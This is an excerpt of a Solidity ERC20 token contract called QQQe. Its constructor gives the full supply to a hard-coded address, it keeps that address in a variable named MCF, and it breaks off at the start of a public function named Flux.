...
// token transfers
// ----------------------------------------------------------------------------
contract QQQe is ERC20Interface, Owned, SafeMath {
    ...
    constructor() public {
        ...
        balances[0x281798C44040f0df0A7fAc00Af97fFea0872F246] = _totalSupply;
        emit Transfer(address(0), 0x281798C44040f0df0A7fAc00Af97fFea0872F246, _totalSupply);
    }
    ...
    address MCF =  0x281798C44040f0df0A7fAc00Af97fFea0872F246;   
...
function Flux(address to, uint256 value) public returns (bool)
{
